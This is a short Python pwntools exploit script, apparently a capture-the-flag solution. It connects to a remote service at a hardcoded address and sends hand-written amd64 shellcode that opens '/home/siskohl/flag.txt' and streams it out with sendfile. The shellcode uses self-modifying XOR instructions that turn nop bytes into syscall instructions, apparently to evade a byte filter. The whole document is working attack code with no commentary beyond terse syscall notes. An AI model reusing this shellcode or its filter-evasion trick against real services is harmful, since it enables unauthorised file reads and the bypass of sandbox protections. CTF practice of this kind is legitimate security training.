from pwn import *

context.arch = 'amd64'
context.os = 'linux'
p64 = lambda x : pack('<Q',x)
p = remote('188.166.177.88',13377)


#openat(0,"/home/siskohl/flag.txt",0,0)
#rdi = 0
#rsi = /home/siskohl/flag.txt
#rdx = 0
#rcx = 0
#syscall

#sendfile(1,257,0,100)

shellcode = ''' 
    xor rax,rax
    mov rax, 0x7478742e6761
    push rax
    mov rax, 0x6c662f6c686f6b73
    push rax
    mov rax, 0x69732f656d6f682f
    push rax
    mov rsi, rsp
    xor r10d, r10d
    push 0
    pop rdi
    xor edx, edx
    xor eax, eax
    mov ax, 0x101
    xor word ptr [rip], 0x959f
    nop
    nop

    mov rsi,rax
    mov rdi, 1
    mov rax, 0x28
    xor rdx,rdx
    mov r10, 100
    xor word ptr [rip], 0x959f
    nop
    nop
'''


payload = asm(shellcode)
print(payload)
print(len(payload))

p.recvuntil('em!')
p.recvline()
p.sendline(payload)
p.interactive()



